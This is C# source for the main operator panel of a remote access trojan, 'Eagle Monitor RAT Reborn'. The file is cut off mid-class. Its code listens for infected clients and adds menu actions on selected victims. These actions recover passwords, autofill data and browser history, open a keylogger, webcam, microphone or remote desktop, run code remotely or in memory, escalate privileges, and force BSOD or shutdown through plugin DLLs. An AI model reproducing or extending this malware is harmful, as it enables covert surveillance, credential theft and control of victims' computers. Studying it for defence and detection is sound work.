﻿using EagleMonitor.Config;
using EagleMonitor.Controls;
using EagleMonitor.Forms;
using EagleMonitor.Networking;
using EagleMonitor.Utils;
using Leaf.xNet;
using Newtonsoft.Json;
using PacketLib;
using PacketLib.Packet;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor
{
    public partial class Main : FormPattern
    {
        private delegate void LoadSettings();
        private delegate string Performance();

        private LoadSettings loadSettings;
        private Performance performance;    
        
        public Main()
        {
            InitializeComponent();
        }

        private void Settings() 
        {
            dataGridView1.EnableHeadersVisualStyles = false;
            dataGridView1.ClearSelection();

            dataGridView2.EnableHeadersVisualStyles = false;
            dataGridView2.ClearSelection();

            Directory.CreateDirectory("Logs");
            Directory.CreateDirectory("Clients");
            if (File.Exists(Miscellaneous.GPath + "\\config.json"))
            {
                string json = File.ReadAllText(Miscellaneous.GPath + "\\config.json");
                Miscellaneous.settings = JsonConvert.DeserializeObject<Settings>(json);
                foreach (int p in Miscellaneous.settings.ports)
                {
                    new Thread(() =>
                    {
                        ServerHandler s = new ServerHandler();
                        s.Listen(p);
                    }).Start();
                }
            }
            else 
            {
                Process proc = Process.Start("Eagle Monitor Configurator.exe");
                Miscellaneous.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
            }
        }
        private void SettingsLoaded(IAsyncResult ar) 
        {
            loadSettings.EndInvoke(ar);
            this.BeginInvoke((MethodInvoker)(() =>
            {
                this.label2.Text = "Listening on : { ";
                foreach (int p in Miscellaneous.settings.ports)
                {
                    this.label2.Text += p.ToString() + ", ";
                }

                this.label2.Text = this.label2.Text.Remove(this.label2.Text.Length - 2, 2);
                this.label2.Text += " }";
            }));
        }

        private string PerformanceCalculator()
        {
            Thread.Sleep(1000);
            return $"CPU {(int)performanceCounter1.NextValue()}%     RAM {(long)performanceCounter2.NextValue()}%";
        }

        private void EndPerformanceCalculator(IAsyncResult ar) 
        {
            Main mainForm = ar.AsyncState as Main;
            mainForm.BeginInvoke((MethodInvoker)(() =>
            {
                labelPerformance.Text = performance.EndInvoke(ar);
            }));
            performance.BeginInvoke(new AsyncCallback(EndPerformanceCalculator), this);
        }

        private void Main_Load(object sender, EventArgs e)
        {

            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(dataGridView1, guna2VScrollBar1, true);
            new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(dataGridView2, guna2VScrollBar2, true);
            //                this.label1.Text = $"Eagle Monitor RAT Reborn V{AboutForm.CoreAssembly.Version}";


            this.Text = $"Eagle Monitor RAT Reborn V{AboutForm.CoreAssembly.Version} @Welcome " + Environment.UserName + " !";
            this.label1.Text = $"Eagle Monitor RAT Reborn V{AboutForm.CoreAssembly.Version} @Welcome " + Environment.UserName + " !";

            Miscellaneous.Enable(this.dataGridView1);
            Miscellaneous.Enable(this.dataGridView2);
        }

        private void Main_Shown(object sender, EventArgs e)
        {

            loadSettings = new LoadSettings(Settings);
            performance = new Performance(PerformanceCalculator);
            loadSettings.BeginInvoke(new AsyncCallback(SettingsLoaded), this);
            performance.BeginInvoke(new AsyncCallback(EndPerformanceCalculator), this);

            this.BeginInvoke((MethodInvoker)(() =>
            {
                try
                {
                    using (HttpRequest httpRequest = new HttpRequest())
                    {
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.UserAgent = Http.ChromeUserAgent();
                        httpRequest.ConnectTimeout = 30000;
                        string request = httpRequest.Get("https://api.github.com/repos/arsium/EagleMonitorRAT/releases").ToString();

                        List<GitHubAPI> json = JsonConvert.DeserializeObject<List<GitHubAPI>>(request);
                        foreach (GitHubAPI gitHubAPI in json)
                        {
                            this.updateLogRichTextBox.SelectionColor = Color.FromArgb(197, 66, 245);
                            this.updateLogRichTextBox.AppendText("Version : " + gitHubAPI.tag_name + "\n\n");

                            this.updateLogRichTextBox.SelectionColor = Color.FromArgb(66, 182, 245);
                            this.updateLogRichTextBox.AppendText(gitHubAPI.body.Replace("*", "•") + "\n\n\n");
                        }
                    }
                }
                catch (Exception ex)
                {
                    this.updateLogRichTextBox.SelectionColor = Color.Red;
                    this.updateLogRichTextBox.AppendText(ex.ToString());
                }
            }));
        }


        private void dataGridView1_Leave(object sender, EventArgs e)
        {
            dataGridView1.ClearSelection();
            dataGridView1.CurrentCell = null;
        }

        private void dataGridView2_MouseLeave(object sender, EventArgs e)
        {
            dataGridView2.ClearSelection();
            dataGridView2.CurrentCell = null;
        }

        private void Main_MouseLeave(object sender, EventArgs e)
        {
            dataGridView1.ClearSelection();
            dataGridView1.CurrentCell = null;
        }

        //https://stackoverflow.com/questions/4314673/how-to-deselect-all-selected-rows-in-a-datagridview-control
        private void dataGridView1_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DataGridView.HitTestInfo hit = dataGridView1.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.None)
                {
                    dataGridView1.ClearSelection();
                    dataGridView1.CurrentCell = null;
                }
            }
        }

        private void Main_MouseDown(object sender, MouseEventArgs e)
        {
            dataGridView1.ClearSelection();
        }

        private void pictureBox2_MouseHover(object sender, EventArgs e)
        {
            pictureBox2.BackColor = Color.FromArgb(55, 55, 55);
        }

        private void pictureBox2_MouseClick(object sender, MouseEventArgs e)
        {
            Process.Start("https://github.com/arsium");
        }

        private void pictureBox2_MouseDown(object sender, MouseEventArgs e)
        {
            pictureBox2.BackColor = Color.FromArgb(60, 60, 60);
        }

        private void pictureBox2_MouseLeave(object sender, EventArgs e)
        {
            pictureBox2.BackColor = Color.FromArgb(45, 45, 45);
        }

        private void pictureBox2_MouseUp(object sender, MouseEventArgs e)
        {
            pictureBox2.BackColor = Color.FromArgb(45, 45, 45);
        }

        private void passwordsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].passwordsForm != null)
                    { 
                        ClientHandler.ClientHandlersList[IP].passwordsForm.Show(); 
                    }
                    else
                    {
                        ClientHandler.ClientHandlersList[IP].passwordsForm = new PasswordsForm(ClientHandler.ClientHandlersList[IP]); 
                        ClientHandler.ClientHandlersList[IP].passwordsForm.Show(); 
                    }
                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].passwordsForm = new PasswordsForm(ClientHandler.ClientHandlersList[IP]);
                    ClientHandler.ClientHandlersList[IP].passwordsForm.Show();
                }
                finally
                {
                    ClientHandler.ClientHandlersList[IP].passwordsForm.Text = "Passwords Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].passwordsForm.label1.Text = "Passwords Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].passwordsForm.loadingCircle1.Visible = true;
                    ClientHandler.ClientHandlersList[IP].passwordsForm.loadingCircle1.Active = true;
                }
            }
        }

        private void autofillToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].autofillForm != null)
                    { 
                        ClientHandler.ClientHandlersList[IP].autofillForm.Show(); 
                    }
                    else
                    {
                        ClientHandler.ClientHandlersList[IP].autofillForm = new AutofillForm(ClientHandler.ClientHandlersList[IP]); 
                        ClientHandler.ClientHandlersList[IP].autofillForm.Show();
                    }
                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].autofillForm = new AutofillForm(ClientHandler.ClientHandlersList[IP]);
                    ClientHandler.ClientHandlersList[IP].autofillForm.Show();
                }
                finally
                {
                    ClientHandler.ClientHandlersList[IP].autofillForm.Text = "Autofill Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].autofillForm.label1.Text = "Autofill Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].autofillForm.loadingCircle1.Visible = true;
                    ClientHandler.ClientHandlersList[IP].autofillForm.loadingCircle1.Active = true;
                }
            }
        }

        private void keywordsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].keywordsForm != null)
                    { 
                        ClientHandler.ClientHandlersList[IP].keywordsForm.Show();
                    }
                    else
                    {
                        ClientHandler.ClientHandlersList[IP].keywordsForm = new KeywordsForm(ClientHandler.ClientHandlersList[IP]);
                        ClientHandler.ClientHandlersList[IP].keywordsForm.label1.Text = "Keywords Recovery: " + ClientHandler.ClientHandlersList[IP].fullName; ClientHandler.ClientHandlersList[IP].keywordsForm.Show();
                    }
                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].keywordsForm = new KeywordsForm(ClientHandler.ClientHandlersList[IP]);
                    ClientHandler.ClientHandlersList[IP].keywordsForm.Show();
                }
                finally
                {
                    ClientHandler.ClientHandlersList[IP].keywordsForm.Text = "Keywords Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].keywordsForm.label1.Text = "Keywords Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].keywordsForm.loadingCircle1.Visible = true;
                    ClientHandler.ClientHandlersList[IP].keywordsForm.loadingCircle1.Active = true;
                }
            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].fileManagerForm != null)
                    {
                        ClientHandler.ClientHandlersList[IP].fileManagerForm.Show(); 
                    }
                    else
                    { 
                        ClientHandler.ClientHandlersList[IP].fileManagerForm = new FileManagerForm(ClientHandler.ClientHandlersList[IP]);
                        ClientHandler.ClientHandlersList[IP].fileManagerForm.Show();
                    }
                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].fileManagerForm = new FileManagerForm(ClientHandler.ClientHandlersList[IP]); 
                    ClientHandler.ClientHandlersList[IP].fileManagerForm.Show();
                }
                finally 
                {
                    ClientHandler.ClientHandlersList[IP].fileManagerForm.Text = "File Manager: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].fileManagerForm.label1.Text = "File Manager: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].fileManagerForm.loadingCircle1.Visible = true;
                    ClientHandler.ClientHandlersList[IP].fileManagerForm.loadingCircle1.Active = true;
                }
            }
        }

        private void processManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].processManagerForm != null)
                    { 
                        ClientHandler.ClientHandlersList[IP].processManagerForm.Show(); 
                    }
                    else
                    { 
                        ClientHandler.ClientHandlersList[IP].processManagerForm = new ProcessManagerForm(ClientHandler.ClientHandlersList[IP]); 
                        ClientHandler.ClientHandlersList[IP].processManagerForm.Show();
                    }

                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].processManagerForm = new ProcessManagerForm(ClientHandler.ClientHandlersList[IP]);
                    ClientHandler.ClientHandlersList[IP].processManagerForm.Show();
                }
                finally 
                {
                    ClientHandler.ClientHandlersList[IP].processManagerForm.processDataGridView.Rows.Clear(); 
                    ClientHandler.ClientHandlersList[IP].processManagerForm.Text = "Process Manager: " + ClientHandler.ClientHandlersList[IP].IP;
                    ClientHandler.ClientHandlersList[IP].processManagerForm.label1.Text = "Process Manager: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].processManagerForm.loadingCircle1.Visible = true;
                    ClientHandler.ClientHandlersList[IP].processManagerForm.loadingCircle1.Active = true;
                }
            }
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].keyloggerForm != null)
                    { 
                        ClientHandler.ClientHandlersList[IP].keyloggerForm.Show(); 
                    }
                    else
                    { 
                        ClientHandler.ClientHandlersList[IP].keyloggerForm = new KeyloggerForm(IP); 
                        ClientHandler.ClientHandlersList[IP].keyloggerForm.Show(); 
                    }

                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].keyloggerForm = new KeyloggerForm(IP); 
                    ClientHandler.ClientHandlersList[IP].keyloggerForm.Show();
                }
                finally
                {
                    ClientHandler.ClientHandlersList[IP].keyloggerForm.Text = "Keylogger: " + ClientHandler.ClientHandlersList[IP].IP;
                    ClientHandler.ClientHandlersList[IP].keyloggerForm.label1.Text = "Keylogger: " + ClientHandler.ClientHandlersList[IP].fullName;
                }
            }
        }

        private void remoteCodeExecutionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].remoteCodeForm != null)
                    {
                        ClientHandler.ClientHandlersList[IP].remoteCodeForm.Show();
                    }
                    else
                    {
                        ClientHandler.ClientHandlersList[IP].remoteCodeForm = new RemoteCodeForm(ClientHandler.ClientHandlersList[IP]);
                        ClientHandler.ClientHandlersList[IP].remoteCodeForm.Show();
                    }

                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].remoteCodeForm = new RemoteCodeForm(ClientHandler.ClientHandlersList[IP]);
                    ClientHandler.ClientHandlersList[IP].remoteCodeForm.Show();
                }
                finally
                {
                    ClientHandler.ClientHandlersList[IP].remoteCodeForm.Text = "Remote Code Execution: " + ClientHandler.ClientHandlersList[IP].IP;
                    ClientHandler.ClientHandlersList[IP].remoteCodeForm.label3.Text = "Remote Code Execution: " + ClientHandler.ClientHandlersList[IP].fullName;
                }
            }
        }

        private void historyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].historyForm != null)
                    {                   
                        ClientHandler.ClientHandlersList[IP].historyForm.Show(); 
                    }
                    else
                    {
                        ClientHandler.ClientHandlersList[IP].historyForm = new HistoryForm(ClientHandler.ClientHandlersList[IP]);
                        ClientHandler.ClientHandlersList[IP].historyForm.Show();
                    }
                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].historyForm = new HistoryForm(ClientHandler.ClientHandlersList[IP]);
                    ClientHandler.ClientHandlersList[IP].historyForm.Show();
                }
                finally
                {
                    ClientHandler.ClientHandlersList[IP].historyForm.Text = "History Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].historyForm.label1.Text = "History Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].historyForm.loadingCircle1.Visible = true;
                    ClientHandler.ClientHandlersList[IP].historyForm.loadingCircle1.Active = true;
                }
            }
        }

        private void miscealleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].miscellaneousForm != null)
                    { 
                        ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show(); 
                    }
                    else
                    {
                        ClientHandler.ClientHandlersList[IP].miscellaneousForm = new MiscellaneousForm(ClientHandler.ClientHandlersList[IP]);
                        ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show();
                    }
                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].miscellaneousForm = new MiscellaneousForm(ClientHandler.ClientHandlersList[IP]); 
                    ClientHandler.ClientHandlersList[IP].miscellaneousForm.Show();
                }
                finally
                {
                    ClientHandler.ClientHandlersList[IP].miscellaneousForm.Text = "Miscellaneous Panel: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].miscellaneousForm.label9.Text = "Miscellaneous Panel: " + ClientHandler.ClientHandlersList[IP].fullName;
                }
            }
        }

        private void chatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].chatForm != null)
                    {
                        ClientHandler.ClientHandlersList[IP].chatForm.Show();
                    }
                    else
                    {
                        ClientHandler.ClientHandlersList[IP].chatForm = new RemoteChatForm(IP);
                        ClientHandler.ClientHandlersList[IP].chatForm.Show();
                    }
                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].chatForm = new RemoteChatForm(IP);
                    ClientHandler.ClientHandlersList[IP].chatForm.Show();
                }
                finally
                {
                    ClientHandler.ClientHandlersList[IP].chatForm.Text = "Chat: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].chatForm.label3.Text = "Chat: " + ClientHandler.ClientHandlersList[IP].fullName;
                }
            }
        }


        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PowerPacket powerPacket = new PowerPacket(PacketType.POWER_SHUTDOWN);
            powerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\PowerManager.dll"), 1);
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(powerPacket);
            }
        }

        private void rebootToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PowerPacket powerPacket = new PowerPacket(PacketType.POWER_REBOOT);
            powerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\PowerManager.dll"), 1);
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(powerPacket);
            }
        }

        private void logOutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PowerPacket powerPacket = new PowerPacket(PacketType.POWER_LOG_OUT);
            powerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\PowerManager.dll"), 1);
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(powerPacket);
            }
        }

        private void bSODToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PowerPacket powerPacket = new PowerPacket(PacketType.POWER_BSOD);
            powerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\PowerManager.dll"), 1);
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(powerPacket);
            }
        }

        private void lockWorkstationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PowerPacket powerPacket = new PowerPacket(PacketType.POWER_LOCK_WORKSTATION);
            powerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\PowerManager.dll"), 1);
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(powerPacket);
            }
        }

        private void hibernateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PowerPacket powerPacket = new PowerPacket(PacketType.POWER_HIBERNATE);
            powerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\PowerManager.dll"), 1);
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(powerPacket);
            }
        }

        private void suspendToolStripMenuItem_Click(object sender, EventArgs e)
        {
            PowerPacket powerPacket = new PowerPacket(PacketType.POWER_SUSPEND);
            powerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\PowerManager.dll"), 1);
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(powerPacket);
            }
        }

        private void closeStripMenuItem_Click(object sender, EventArgs e)
        {
            ClosePacket closePacket = new ClosePacket();
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(closePacket);
            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            UninstallPacket uninstallPacket = new UninstallPacket();
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(uninstallPacket);
            }
        }

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].remoteDesktopForm != null)
                    {                 
                        ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Show(); 
                    }
                    else
                    { 
                        ClientHandler.ClientHandlersList[IP].remoteDesktopForm = new RemoteDesktopForm(IP); 
                        ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Show();
                    }

                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].remoteDesktopForm = new RemoteDesktopForm(IP); 
                    ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Show();
                }
                finally
                {
                    ClientHandler.ClientHandlersList[IP].remoteDesktopForm.Text = "Remote Desktop: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].remoteDesktopForm.label3.Text = "Remote Desktop: " + ClientHandler.ClientHandlersList[IP].fullName;
                }
            }
        }

        private void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].remoteCameraForm != null)
                    { 
                        ClientHandler.ClientHandlersList[IP].remoteCameraForm.Show();
                    }
                    else
                    { 
                        ClientHandler.ClientHandlersList[IP].remoteCameraForm = new RemoteCameraForm(IP);
                        ClientHandler.ClientHandlersList[IP].remoteCameraForm.Show();
                    }

                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].remoteCameraForm = new RemoteCameraForm(IP);
                    ClientHandler.ClientHandlersList[IP].remoteCameraForm.Show();
                }
                finally 
                {
                    ClientHandler.ClientHandlersList[IP].remoteCameraForm.Text = "Remote Webcam: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].remoteCameraForm.label3.Text = "Remote Webcam: " + ClientHandler.ClientHandlersList[IP].fullName;
                }
            }
        }

        private void remoteMicrophoneToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].remoteAudioForm != null)
                    {
                        ClientHandler.ClientHandlersList[IP].remoteAudioForm.Show();
                    }
                    else
                    {
                        ClientHandler.ClientHandlersList[IP].remoteAudioForm = new RemoteAudioForm(IP); 
                        ClientHandler.ClientHandlersList[IP].remoteAudioForm.Show();
                    }

                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].remoteAudioForm = new RemoteAudioForm(IP);
                    ClientHandler.ClientHandlersList[IP].remoteAudioForm.Show();
                }
                finally 
                {
                    ClientHandler.ClientHandlersList[IP].remoteAudioForm.Text = "Remote Microphone: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].remoteAudioForm.label2.Text = "Remote Microphone: " + ClientHandler.ClientHandlersList[IP].fullName;
                }
            }
        }


        private void massTaskToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (Program.massForm != null)
            {
                Program.massForm.Show();
            }
            else
            {
                Program.massForm = new MassForm();
                Program.massForm.Show();
            }
        }

        private void memoryExecutionToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].memoryExecutionForm != null)
                    { 
                        ClientHandler.ClientHandlersList[IP].memoryExecutionForm.Show(); 
                    }
                    else
                    {
                        ClientHandler.ClientHandlersList[IP].memoryExecutionForm = new MemoryExecutionForm(ClientHandler.ClientHandlersList[IP]);
                        ClientHandler.ClientHandlersList[IP].memoryExecutionForm.Show();
                    }
                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].memoryExecutionForm = new MemoryExecutionForm(ClientHandler.ClientHandlersList[IP]); ClientHandler.ClientHandlersList[IP].memoryExecutionForm.Show();
                }
                finally 
                {
                    ClientHandler.ClientHandlersList[IP].memoryExecutionForm.Text = "Memory Execution: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].memoryExecutionForm.label2.Text = "Memory Execution: " + ClientHandler.ClientHandlersList[IP].fullName;
                }
            }
        }

        private void informationToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].informationForm != null)
                    {
                        ClientHandler.ClientHandlersList[IP].informationForm.Show(); 
                    }
                    else
                    { 
                        ClientHandler.ClientHandlersList[IP].informationForm = new InformationForm(ClientHandler.ClientHandlersList[IP]);
                        ClientHandler.ClientHandlersList[IP].informationForm.Show();
                    }

                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].informationForm = new InformationForm(ClientHandler.ClientHandlersList[IP]); 
                    ClientHandler.ClientHandlersList[IP].informationForm.Show();
                }
                finally
                {
                    ClientHandler.ClientHandlersList[IP].informationForm.Text = "Information: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].informationForm.label5.Text = "Information: " + ClientHandler.ClientHandlersList[IP].fullName;
                }
            }
        }

        private void restorePointtoolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                try
                {
                    if (ClientHandler.ClientHandlersList[IP].restorePointForm != null)
                    {
                        ClientHandler.ClientHandlersList[IP].restorePointForm.Show();
                    }
                    else
                    {
                        ClientHandler.ClientHandlersList[IP].restorePointForm = new RestorePointForm(ClientHandler.ClientHandlersList[IP]);
                        ClientHandler.ClientHandlersList[IP].restorePointForm.Show();
                    }

                }
                catch (Exception)
                {
                    ClientHandler.ClientHandlersList[IP].restorePointForm = new RestorePointForm(ClientHandler.ClientHandlersList[IP]);
                    ClientHandler.ClientHandlersList[IP].restorePointForm.Show();
                }
                finally
                {
                    ClientHandler.ClientHandlersList[IP].restorePointForm.Text = "Restore Points: " + ClientHandler.ClientHandlersList[IP].fullName;
                    ClientHandler.ClientHandlersList[IP].restorePointForm.label1.Text = "Restore Points: " + ClientHandler.ClientHandlersList[IP].fullName;
                }
            }
        }

        private void getPrivilegeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AskAdminRightsPacket askAdminRightsPacket = new AskAdminRightsPacket
            {
                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Miscellaneous.GPath + "\\Plugins\\Miscellaneous.dll"), 1)
            };
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string IP = dataGridViewRow.Cells[2].Value.ToString();
                ClientHandler.ClientHandlersList[IP].SendPacket(askAdminRightsPacket);
            }
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new AboutForm().Show();
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            Miscellaneous.ToCSV(Program.mainForm.dataGridView2);
            Miscellaneous.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

